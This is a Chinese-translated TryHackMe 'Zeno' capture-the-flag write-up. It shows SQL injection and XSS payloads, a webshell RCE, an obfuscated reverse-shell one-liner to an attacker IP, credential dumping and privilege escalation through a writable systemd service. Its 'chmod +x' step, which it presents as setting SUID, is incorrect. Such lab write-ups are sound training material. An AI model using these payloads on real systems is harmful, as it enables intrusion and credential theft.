<html>
<head>
<title>Zeno — THM Writeup (Abusing service file misconfigurations)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Zeno — THM Writeup(滥用服务文件错误配置)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/zeno-thm-writeup-abusing-service-file-misconfigurations-3dd8ac94be24?source=collection_archive---------1-----------------------#2021-10-24">https://infosecwriteups.com/zeno-thm-writeup-abusing-service-file-misconfigurations-3dd8ac94be24?source=collection_archive---------1-----------------------#2021-10-24</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><p id="95f3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">大家好，今天我们要做来自TryHackMe的<a class="ae ks" href="https://tryhackme.com/room/zeno" rel="noopener ugc nofollow" target="_blank"> Zeno </a>。它被评为中等，描述说“你有伟大的斯多葛派哲学家芝诺一样的耐心吗？试试看！”</p><h1 id="8c77" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">端口扫描</h1><p id="25f8" class="pw-post-body-paragraph ju jv iq jw b jx lr jz ka kb ls kd ke kf lt kh ki kj lu kl km kn lv kp kq kr ij bi translated">nmap出现了一些问题，因此它无法显示所有打开的端口。史茹建议我使用Rustscan。谢谢史茹·:D</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi lw"><img src="../Images/91366e7023ace15ef851930fb9af2239.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ip05Xth4EVUE5wbU.png"/></div></div></figure><p id="074b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">找到几个更多的端口。现在，我重新对这些端口进行了nmap扫描:</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mi"><img src="../Images/e29645fce090cecb36b2f8d63026ca61.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YcHNoyfw52-dMBEGN6jrEA.png"/></div></div></figure><p id="1484" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们在端口12340上有一个web服务器。让我们检查一下。</p><h1 id="21cd" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">网络服务器</h1><p id="cc09" class="pw-post-body-paragraph ju jv iq jw b jx lr jz ka kb ls kd ke kf lt kh ki kj lu kl km kn lv kp kq kr ij bi translated">在用不同的单词表破坏了一些目录后，我发现这些是有趣的:</p><pre class="lx ly lz ma gt mj mk ml mm aw mn bi"><span id="c3cb" class="mo ku iq mk b gy mp mq l mr ms">/index.html (Status: 200)<br/>/rms (Status: 301)</span></pre><p id="78e4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><code class="fe mt mu mv mk b">/index.html</code>不返回任何有用的东西。<code class="fe mt mu mv mk b"> /rms </code>是餐厅管理系统。在后台打开burp代理浏览网站后，我发现了一些参数化的请求。我们可以在删除订单查询中做SQLi:<code class="fe mt mu mv mk b">http://10.10.200.163:12340/rms/delete-order.php?id=0' or 1-- -</code></p><h1 id="ea91" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">sqlmap</h1><p id="5c7a" class="pw-post-body-paragraph ju jv iq jw b jx lr jz ka kb ls kd ke kf lt kh ki kj lu kl km kn lv kp kq kr ij bi translated">我们有基于时间的SQLi。运行sqlmap一段时间后，我收集了以下信息:</p><ul class=""><li id="a429" class="mw mx iq jw b jx jy kb kc kf my kj mz kn na kr nb nc nd ne bi translated">数据库名称:dbrms</li><li id="697d" class="mw mx iq jw b jx nf kb ng kf nh kj ni kn nj kr nb nc nd ne bi translated">找到一些表格:</li></ul><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/e9695b2921e86e3b2fef52c3498f0e2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1294/format:webp/0*xs3kZY0nKxliJeM2.png"/></div></figure><p id="51c8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我在数据库里找不到任何有用的东西。而且要花很多时间。所以让我们看看是否还有其他漏洞。网站显示用户名(名字)。我试过查XSS和SSTI。我找不到SSTI，但发现它储存了XSS。将有效载荷设置为<code class="fe mt mu mv mk b">${{4*4}}&lt;img src=x onerror=alert(1)&gt;</code>以同时检查XSS和SSTI。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nl"><img src="../Images/9aab2cbea6502ca191f3b4a0e4595634.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*WBcwyqx6ixCu0NGu.png"/></div></div><figcaption class="nm nn gj gh gi no np bd b be z dk translated">存储XSS。我们能偷饼干吗？</figcaption></figure><p id="b4fe" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">看看能不能偷其他用户的cookies。创建一个新帐户，并在名字字段中上传一个cookie stealer有效负载。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nq"><img src="../Images/c91a2b0f903badcd676eb90a07e39b24.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*x4pwFrq0vI9Gu8mB.png"/></div></div><figcaption class="nm nn gj gh gi no np bd b be z dk translated">我用打嗝重复这个</figcaption></figure><p id="f510" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在我用这个账号登录，在网站上做了一些动作(比如发评论，买东西等等)，希望能被其他用户点击，这样我就可以抓取他们的cookies了。但是，即使等了几分钟，我也没有得到任何结果。所以可以肯定地说这是一条死胡同。让我们检查一下其他漏洞。</p><h1 id="3e59" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">搜索漏洞</h1><p id="4db4" class="pw-post-body-paragraph ju jv iq jw b jx lr jz ka kb ls kd ke kf lt kh ki kj lu kl km kn lv kp kq kr ij bi translated">我在searchsploit里搜索餐厅管理系统漏洞。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nr"><img src="../Images/6f1d4ae302bb3dbd1c4892173241f656.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7sHHOy2sU5vK_MPn.png"/></div></div></figure><p id="f2e1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">有一个RCE漏洞可用。运行之后，我们在<code class="fe mt mu mv mk b"><a class="ae ks" href="http://ip:12340/rms/images/reverse-shell.php" rel="noopener ugc nofollow" target="_blank">http://ip:12340/rms/images/reverse-shell.php</a></code>上传了一个webshell。使用<code class="fe mt mu mv mk b">?cmd= command</code>执行命令。</p><p id="2952" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">以URL编码形式使用此有效负载:<br/> <code class="fe mt mu mv mk b">echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xNC4xNC43OC84MCAwPiYxCg==|base64 -d|bash</code></p><p id="cdc5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这将运行以下反向shell:</p><pre class="lx ly lz ma gt mj mk ml mm aw mn bi"><span id="e387" class="mo ku iq mk b gy mp mq l mr ms">/bin/sh -i &gt;&amp; /dev/tcp/10.14.14.78/80 0&gt;&amp;1</span></pre><p id="1f91" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我用打嗝解码器对有效载荷进行url编码。最终有效载荷是:</p><pre class="lx ly lz ma gt mj mk ml mm aw mn bi"><span id="488e" class="mo ku iq mk b gy mp mq l mr ms">%65%63%68%6f%20%4c%32%4a%70%62%69%39%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4e%43%34%78%4e%43%34%33%4f%43%38%34%4d%43%41%77%50%69%59%78%43%67%3d%3d%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68</span></pre><p id="8ca1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在攻击者机器的端口80上运行一个监听器，并执行有效负载。</p><h1 id="c02c" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">找到一个弹壳。现在怎么办？</h1><p id="732f" class="pw-post-body-paragraph ju jv iq jw b jx lr jz ka kb ls kd ke kf lt kh ki kj lu kl km kn lv kp kq kr ij bi translated">得到一个shell后，我发现了一个包含密码的配置文件<code class="fe mt mu mv mk b">/var/www/html/rms/connection/config.php</code>。</p><pre class="lx ly lz ma gt mj mk ml mm aw mn bi"><span id="9243" class="mo ku iq mk b gy mp mq l mr ms">bash-4.2$ pwd<br/>/var/www/html/rms/connection<br/>bash-4.2$ cat config.php <br/>&lt;?php<br/>    define('DB_HOST', 'localhost');<br/>    define('DB_USER', 'root');<br/>    define('DB_PASSWORD', 'veerUffIrangUfcubyig');<br/>    define('DB_DATABASE', 'dbrms');<br/>    define('APP_NAME', 'Pathfinder Hotel');<br/>    error_reporting(1);<br/>?&gt;</span></pre><h1 id="7623" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">Mysql数据库枚举</h1><p id="6f95" class="pw-post-body-paragraph ju jv iq jw b jx lr jz ka kb ls kd ke kf lt kh ki kj lu kl km kn lv kp kq kr ij bi translated">在数据库中，有一个名为<code class="fe mt mu mv mk b">members</code>的表。它包含一些密码散列和答案散列。我破解了几个，除了用户<code class="fe mt mu mv mk b">edward</code>的。有趣的是，还有一个名为edward的系统用户。</p><p id="1d12" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">以下是破解的哈希和密码:</p><pre class="lx ly lz ma gt mj mk ml mm aw mn bi"><span id="d62f" class="mo ku iq mk b gy mp mq l mr ms">Username|Email|Password|Security Answer<br/><a class="ae ks" href="mailto:Stephen|omolewastephen@gmail.com" rel="noopener ugc nofollow" target="_blank">Stephen|omolewastephen@gmail.com</a>|1234|deborah<br/><a class="ae ks" href="mailto:john|jsmith@sample.com" rel="noopener ugc nofollow" target="_blank">john|jsmith@sample.com</a>|jsmith123|middlename<br/><a class="ae ks" href="mailto:edward|edward@zeno.com" rel="noopener ugc nofollow" target="_blank">edward|edward@zeno.com</a>|COULD NOT CRACK|COULD NOT CRACK</span></pre><p id="0b85" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我在爱德华的账户上试了试这些密码，但无法登录。</p><h1 id="62e1" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">林豌豆</h1><p id="4813" class="pw-post-body-paragraph ju jv iq jw b jx lr jz ka kb ls kd ke kf lt kh ki kj lu kl km kn lv kp kq kr ij bi translated">现在让我们运行Linpeas</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ns"><img src="../Images/462db181284342c517d0f8ba6eb8c07b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*aDgttcPZa8uiQmlR.png"/></div></div></figure><p id="c024" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们在<code class="fe mt mu mv mk b">/etc/systemd/system/zeno-monitoring.service</code>上有写权限，也发现了新的凭证。</p><pre class="lx ly lz ma gt mj mk ml mm aw mn bi"><span id="1b94" class="mo ku iq mk b gy mp mq l mr ms">username=<strong class="mk ir">zeno</strong>,password=<strong class="mk ir">FrobjoodAdkoonceanJa</strong></span></pre><p id="050b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">以当前用户的身份用这个密码尝试了<code class="fe mt mu mv mk b">sudo -l</code>，但是没有成功。现在让我们尝试编辑服务文件。</p><h1 id="4df1" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">根的服务文件配置错误</h1><p id="577b" class="pw-post-body-paragraph ju jv iq jw b jx lr jz ka kb ls kd ke kf lt kh ki kj lu kl km kn lv kp kq kr ij bi translated">让我们在<code class="fe mt mu mv mk b">/bin/bash</code>上添加SUID位，以便于查看。将ExecStart更改为如下所示:</p><pre class="lx ly lz ma gt mj mk ml mm aw mn bi"><span id="628b" class="mo ku iq mk b gy mp mq l mr ms">ExecStart=/usr/bin/chmod +x /bin/bash</span></pre><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/31db13d99f8105ec57f65611281a6377.png" data-original-src="https://miro.medium.com/v2/resize:fit:930/format:webp/0*9vf7EblSO_DOSgJu.png"/></div><figcaption class="nm nn gj gh gi no np bd b be z dk translated">我们只需要更改ExecStart命令</figcaption></figure><p id="dfd8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，当这项服务再次启动时，我们将有一个SUID <code class="fe mt mu mv mk b">/bin/bash</code>。如果我们能以某种方式重新启动它，我们就能做到这一点。但是作为低特权用户，我们没有权限这样做。另一种方法是我们可以重启系统。我试图重新启动系统，但不能。我们需要root权限才能重新启动。</p><p id="7c68" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">让我们试试之前在用户<code class="fe mt mu mv mk b">edward</code>上找到的密码(<code class="fe mt mu mv mk b">FrobjoodAdkoonceanJa</code>)。我们可以以edward的身份成功登录🎉。</p><p id="a752" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">检查edward的<code class="fe mt mu mv mk b">sudo -l</code>权限，我们看到他可以重启系统。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/a727b93b6bc1c32b62a33ba56109ee4e.png" data-original-src="https://miro.medium.com/v2/resize:fit:784/format:webp/0*9vQRTDf5I7FK8g-I.png"/></div><figcaption class="nm nn gj gh gi no np bd b be z dk translated">用户edward可以重启系统</figcaption></figure><p id="2b79" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">用<code class="fe mt mu mv mk b">sudo /usr/sbin/reboot</code>重启机器，现在当系统完全重启后，通过ssh以edward的身份登录。我们现在有了一个SUID。使用它将权限提升到根用户<strong class="jw ir"/></p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/98931b4a999877e06293a425fe512de7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1340/format:webp/0*87kQI9q81kcFBX_g.png"/></div><figcaption class="nm nn gj gh gi no np bd b be z dk translated">根:p</figcaption></figure><p id="5007" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">芝诺现在是rooted✨</p><p id="f0c2" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">希望很容易坚持到底。下次见。<br/>保重:)</p><p id="0a46" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在推特上找我:<a class="ae ks" href="https://twitter.com/manash036" rel="noopener ugc nofollow" target="_blank"> @manash036 </a></p></div></div>    
</body>
</html>